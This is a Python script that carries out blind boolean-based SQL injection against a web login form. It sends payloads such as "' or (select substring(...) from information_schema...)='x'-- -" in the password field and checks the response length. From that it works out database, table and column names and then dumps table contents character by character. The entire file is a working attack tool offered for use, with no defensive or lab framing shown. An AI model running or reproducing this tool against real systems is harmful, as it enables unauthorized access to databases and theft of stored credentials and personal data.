from pwn import log
import requests, time

def GetDatabaseNumber(url):

    data = {
        "username": "test",
        "password": ""
    }

    database_num = 0

    for l in range(0, 500):

        data["password"] = "' or (select count(*) from information_schema.schemata)=%s-- -"  % (l)

        req = requests.post("%s" % url, data=data)

        if ( len(req.text) > 2000 ):

            database_num = l
            break
        
    return database_num

def GetTableNumber(database, url):

    data = {
        "username": "test",
        "password": ""
    }

    table_num = 0

    for l in range(0, 500):

        data["password"] = "' or (select count(*) from information_schema.tables where table_schema = '%s')=%s-- -" % (database, l)

        req = requests.post("%s" % url, data=data)

        if ( len(req.text) > 2000 ):

            table_num = l
            break

    return table_num

def GetColumnNumber(database, table, url):

    data = {
        "username": "test",
        "password": ""
    }

    column_num = 0

    for l in range(0, 500):

        data["password"] = "' or (select count(*) from information_schema.columns where table_name = '%s' and table_schema = '%s')=%s-- -" % (table, database, l)

        req = requests.post("%s" % url, data=data)

        if ( len(req.text) > 2000 ):

            column_num = l
            break
        
    return column_num

def GetRegisterNumber(database, table, url):

    data = {
        "username": "test",
        "password": ""
    }

    data_num = 0

    for l in range(0, 500):

        data["password"] = "' or (select count(*) from %s.%s)=%s-- -" % (database, table, l)

        req = requests.post("%s" % url, data=data)

        if ( len(req.text) > 2000 ):

            data_num = l
            break

    return data_num

class SQLInjection():

    def __init__(self, url):
        self.url = url
        self.characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-:_,./[](){}$¡!¿?#"

    def GetDatabases(self):

        number_of_databases = GetDatabaseNumber(self.url)

        data = {
            "username": "test",
            "password": ""
        }

        if (number_of_databases == None):

            no_databases = log.progress("No databases found")

            no_databases.status("No databases found")

        else:

            for database in range(0, number_of_databases):

                found_data = ""

                database_name = log.progress("Database %s" % database)

                database_name.status("Searching database...")

                time.sleep(0.5)

                for i in range(0, 50):
                    for ch in self.characters:

                        data["password"] = "' or (select substring(schema_name,%s,1) from information_schema.schemata limit %s,1)='%s'-- -" % (i, database, ch)

                        req = requests.post("%s" % self.url, data=data)

                        if ( len(req.text) > 2000 ):
                    
                            found_data += ch
                            database_name.status(found_data)
                            break

    def GetTables(self, database):

        number_of_tables = GetTableNumber(database, self.url)

        data = {
            "username": "test",
            "password": ""
        }

        if (number_of_tables == None):

            no_tables = log.progress("No tables found")

            no_tables.status("No tables found")

        else:

            for i in range(0, number_of_tables):
                
                table_name = log.progress("Table %s" % i)

                table_name.status("Searching table...")

                time.sleep(0.5)

                found_data = ""

                for l in range(0, 50):
                    for ch in self.characters:

                        data["password"] = "' or (select substring(table_name,%s,1) from information_schema.tables where table_schema = '%s' limit %s,1)='%s'-- -" % (l, database, i, ch)

                        req = requests.post("%s" % self.url, data=data)

                        if ( len(req.text) > 2000 ):

                            found_data += ch
                            table_name.status(found_data)
                            break

    def GetColumns(self, database, table):
       
        number_of_columns = GetColumnNumber(database, table, self.url)

        data = {
            "username": "test",
            "password": ""
        }

        if (number_of_columns == None):

            no_columns = log.progress("No columns found")

            no_columns.status("No columns found")

        else:
    
            for i in range(0, number_of_columns):

                column_name = log.progress("Column %s" % i)

                column_name.status("Searching column...")

                time.sleep(0.5)

                found_data = ""

                for l in range(0, 50):
                    for ch in self.characters:

                        data["password"] = "' or (select substring(column_name,%s,1) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %s,1)='%s'-- -" % (l, database, table, i, ch)

                        req = requests.post("%s" % self.url, data=data)

                        if ( len(req.text) > 2000 ):

                            found_data += ch
                            column_name.status(found_data)
                            break

    def GetData(self, database, table, column):

        registers = GetRegisterNumber(database, table, self.url)

        data = {
            "username": "test",
            "password": ""
        }

        if (registers == None):

            no_registers = log.progress("No registers found")

            no_registers.status("No registers found")

        else:

            for i in range(0, registers):

                register_data = log.progress("Register %s" % i)

                register_data.status("Searching data...")

                found_data = ""

                time.sleep(0.5)

                for l in range(0, 50):
                    for ch in self.characters:

                        data["password"] = "' or (select substring(%s,%s,1) from %s.%s limit %s,1)='%s'-- -" % (column, l, database, table, i, ch)

                        req = requests.post("%s" % self.url, data=data)

                        if ( len(req.text) > 2000 ):

                            found_data += ch
                            register_data.status(found_data)
                            break
